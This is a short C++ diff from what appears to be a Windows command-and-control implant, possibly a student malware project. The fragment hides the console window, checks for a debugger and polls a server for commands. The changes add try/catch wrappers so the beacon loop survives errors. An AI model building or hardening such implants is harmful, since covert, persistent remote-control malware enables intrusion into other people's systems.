@@ -75,6 +75,8 @@ int check_ch0nky(){
 }
 
 int main(){
+    while(1){
+        try{
 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 //MessageBoxA(NULL,NULL,NULL,MB_YESNO);
 Sleep(100);
@@ -154,6 +156,7 @@ check_debugger();
 
     //exit(1);
     while(1){
+        try{
         Sleep(sleep_value);
         resp = getNextCommand(config);
         //std::cout << resp << std::endl;
@@ -230,12 +233,26 @@ check_debugger();
 
             }
         }else{
-                if(command["command_type"]=="sleep"){
+
+             try{
+            if(command["command_type"]=="sleep"){
                 std::string val = command["command_text"];
                 sleep_value =std::stoi(val);
                 }
+            }catch(const std::exception& e){
+
+            }
+                
                 //std::cout << sleep_value << "Hahaha" << std::endl;
         }
+        }catch(const std::exception& e){
+
+        }
+
+    }
+    }catch(const std::exception& e){
+
+    }
     }
     
 
